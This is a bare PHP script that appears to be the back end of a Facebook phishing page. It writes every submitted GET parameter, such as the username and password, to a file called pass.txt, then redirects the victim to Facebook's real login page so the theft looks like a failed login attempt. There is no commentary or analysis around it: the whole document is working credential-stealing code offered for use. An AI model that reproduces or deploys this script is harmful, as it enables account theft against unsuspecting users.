 <?php 
$handle = fopen("pass.txt", "a"); 
foreach($_GET as $variable => $value) { 
fwrite($handle, $variable); 
fwrite($handle, "="); 
fwrite($handle, $value); 
fwrite($handle, "\r\n");
$redirect = "https://www.facebook.com/login.php?login_attempt=1";
header("Location:$redirect "); 
} 
fwrite($handle, "\r\n"); 
fclose($handle); 
exit; 
?>

